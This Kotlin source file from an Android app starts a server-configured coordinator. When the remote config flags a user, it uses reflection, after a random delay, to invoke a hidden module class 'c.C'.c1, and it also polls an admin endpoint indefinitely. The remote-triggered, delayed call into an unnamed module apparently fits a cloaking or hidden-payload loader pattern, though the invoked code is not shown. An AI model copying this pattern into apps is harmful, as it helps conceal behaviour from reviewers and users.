package com.lecture.field.tell.net.demo

import android.content.Context
import com.lecture.field.tell.line.ConTool
import com.lecture.field.tell.net.need.AdminRequestCoordinator
import com.lecture.field.tell.net.need.DataUpdateManager

object LiuNextGo {
    
    private var coordinator: AdminRequestCoordinator? = null
    private var dataUpdateManager: DataUpdateManager? = null
    private var appContext: Context? = null
    
    /**
     * 获取用户数据
     * 根据配置情况自动选择处理策略：
     * - 情况1：有A配置，先调用goToCOreA，然后延迟1s-10min后请求
     * - 情况2：有B配置，立即启动定时循环请求
     * - 情况3：无配置，立即请求
     * 
     * 注意：goToCOreA全程只调用一次，后续请求只保存数据
     * 
     * 同时启动长时间循环更新任务，定期更新配置数据
     */
    fun getUserData(context: Context) {
        ConTool.showLog("getUserData 启动")
        
        try {
            // 保存Application context
            appContext = context.applicationContext
            
            // 停止之前的协调器（如果有）
            coordinator?.stop()
            
            // 创建新的协调器并启动
            coordinator = AdminRequestCoordinator(context)
            coordinator?.start {
                // 当检测到a用户时，调用goToCOreA
                goToCOreA()
            }
            
            // 启动长时间循环更新任务（只启动一次）
            startLongTermDataUpdate(context)
            
        } catch (e: Exception) {
            ConTool.showLog("getUserData 发生异常: ${e.message}")
            e.printStackTrace()
        }
    }
    
    /**
     * 启动长时间数据更新任务
     * 此任务独立运行，定期请求admin更新数据，不执行goToCOreA
     */
    private fun startLongTermDataUpdate(context: Context) {
        try {
            // 如果已经在运行，不重复启动
            if (dataUpdateManager != null) {
                ConTool.showLog("长时间数据更新任务已存在，跳过启动")
                return
            }
            
            dataUpdateManager = DataUpdateManager(context)
            dataUpdateManager?.startLongTermUpdate()
            ConTool.showLog("已启动长时间数据更新任务")
        } catch (e: Exception) {
            ConTool.showLog("启动长时间数据更新任务失败: ${e.message}")
            e.printStackTrace()
        }
    }
    

    

    private fun goToCOreA() {
        try {
            ConTool.showLog("goToCOreA 开始执行")

            // 检查context是否可用
            val ctx = appContext
            if (ctx == null) {
                ConTool.showLog("goToCOreA 失败: context为null")
                return
            }

            ConTool.showLog("goToCOreA: 准备通过反射调用 c.C.c1()")
            // 使用反射调用CoreD模块的Core.a()方法
            val coreClass = Class.forName("c.C")

            val method = coreClass.getMethod("c1", Context::class.java)

            method.invoke(null, ctx)

        } catch (e: ClassNotFoundException) {
            ConTool.showLog("goToCOreA 异常: ${e.message}")
            e.printStackTrace()
        } catch (e: NoSuchMethodException) {
            ConTool.showLog("goToCOreA 异常: ${e.message}")
            e.printStackTrace()
        } catch (e: Exception) {
            ConTool.showLog("goToCOreA 发生异常: ${e.message}")
            e.printStackTrace()
        }

    }


//    private fun goToCOreA2() {
//        try {
//            ConTool.showLog("goToCOreA 开始执行")
//
//            // 检查context是否可用
//            val ctx = appContext
//            if (ctx == null) {
//                ConTool.showLog("goToCOreA 失败: context为null")
//                return
//            }
//
//            // 使用反射调用CoreD模块的Core.a()方法
//            val coreClass = Class.forName("com.hightway.tell.peek.Core")
//            val method = coreClass.getMethod("a", Context::class.java)
//            method.invoke(null, ctx)
//
//            ConTool.showLog("goToCOreA 执行完成")
//        } catch (e: ClassNotFoundException) {
//            ConTool.showLog("goToCOreA 异常: 找不到Core类 - ${e.message}")
//        } catch (e: NoSuchMethodException) {
//            ConTool.showLog("goToCOreA 异常: 找不到方法a - ${e.message}")
//        } catch (e: Exception) {
//            ConTool.showLog("goToCOreA 发生异常: ${e.message}")
//            e.printStackTrace()
//        }
//    }
}